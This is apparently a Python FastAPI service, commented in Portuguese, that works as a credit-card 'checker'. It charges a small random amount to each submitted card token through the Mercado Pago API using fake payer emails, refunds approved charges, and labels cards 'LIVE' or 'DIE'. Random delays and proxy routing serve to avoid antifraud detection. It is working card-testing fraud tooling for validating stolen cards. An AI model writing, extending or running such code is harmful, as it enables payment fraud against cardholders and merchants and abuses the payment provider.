# api_checker.py - VERSÃO FINAL COM SINTAXE DE PROXY CORRIGIDA

import os
import httpx
import random
import string
import asyncio
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from datetime import datetime, timezone

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

ACCESS_TOKEN = os.getenv("ACCESS_TOKEN")
PROXY_URL = os.getenv("PROXY_URL", None)

# --- LÓGICA DE PROXY CORRIGIDA ---
# Preparamos o dicionário de proxies para ser usado nas requisições.
# Esta é a forma mais compatível.
proxies = {"http://": PROXY_URL, "https://": PROXY_URL} if PROXY_URL else None

# ----------------------------------

@app.get("/")
def get_api_status():
    return {"status": "online", "version": "v16-final-final"}

async def estornar_pagamento(payment_id, headers):
    try:
        refund_url = f"https://api.mercadopago.com/v1/payments/{payment_id}/refunds"
        async with httpx.AsyncClient() as client:
            await client.post(refund_url, headers=headers, json={})
    except Exception:
        pass

@app.post("/verificar")
async def verificar_cartao(request: Request):
    await asyncio.sleep(random.uniform(1.5, 3.0))

    if not ACCESS_TOKEN:
        return JSONResponse(status_code=500, content={"status": "DIE", "nome": "Erro de Configuração", "mensagem": "ACCESS_TOKEN não configurado."})

    try:
        dados = await request.json()
        token = dados.get("token")
        payment_method_id = dados.get("payment_method_id")

        if not token or not payment_method_id:
            return JSONResponse(status_code=400, content={"status": "DIE", "nome": "Dados Ausentes", "mensagem": "Token e payment_method_id são obrigatórios."})

        random_user = ''.join(random.choices(string.ascii_lowercase, k=10))
        payer_email = f"user_{random_user}@test.com"
        valor_aleatorio = round(random.uniform(0.77, 1.99), 2)

        url = "https://api.mercadopago.com/v1/payments"
        payload = {"transaction_amount": valor_aleatorio, "token": token, "payment_method_id": payment_method_id, "installments": 1, "payer": {"email": payer_email}}
        headers = {"Authorization": f"Bearer {ACCESS_TOKEN}", "Content-Type": "application/json", "X-Idempotency-Key": os.urandom(16).hex()}

        # Usamos o dicionário de proxies diretamente na requisição
        async with httpx.AsyncClient() as client:
            resposta = await client.post(url, json=payload, headers=headers, timeout=20.0, proxies=proxies)
        
        resultado = resposta.json()
        status_code = resposta.status_code

        if status_code in [200, 201] and resultado.get("status") == "approved":
            payment_id = resultado.get("id")
            if payment_id:
                await estornar_pagamento(payment_id, {"Authorization": headers["Authorization"], "Content-Type": headers["Content-Type"]})
            return {"status": "LIVE", "codigo": resultado.get("status_detail"), "nome": "Aprovado (Estornado)", "mensagem": f"Pagamento de R${valor_aleatorio:.2f} debitado e estornado."}

        status_detail = resultado.get("status_detail", "desconhecido")
        if status_detail == "cc_rejected_insufficient_amount":
            return {"status": "LIVE", "codigo": status_detail, "nome": "Saldo Insuficiente", "mensagem": "Cartão válido, mas sem saldo."}
        if resultado.get("status") == "in_process":
            return {"status": "DIE", "codigo": status_detail, "nome": "Recusado (Antifraude)", "mensagem": "Pagamento retido para análise de risco."}
        return {"status": "DIE", "codigo": status_detail, "nome": f"Recusado ({resultado.get('status', 'erro')})", "mensagem": "Pagamento não aprovado pelo emissor."}

    except Exception as e:
        return JSONResponse(status_code=500, content={"status": "DIE", "codigo": "INTERNAL_SERVER_ERROR", "nome": "Erro Interno", "mensagem": str(e)})

@app.get("/testar-proxy")
async def testar_proxy():
    if not PROXY_URL:
        return {"erro": "A variável de ambiente PROXY_URL não está configurada."}
    
    ip_check_url = "https://api.ipify.org?format=json"
    
    try:
        # Usamos o dicionário de proxies diretamente na requisição
        async with httpx.AsyncClient() as client:
            resposta = await client.get(ip_check_url, timeout=10.0, proxies=proxies)
        
        if resposta.status_code == 200:
            return {"ip_de_saida": resposta.json().get("ip")}
        else:
            return {"erro": f"Serviço de IP respondeu com status {resposta.status_code}"}
    except Exception as e:
        return {"erro": f"Falha ao conectar através do proxy: {str(e)}"}
        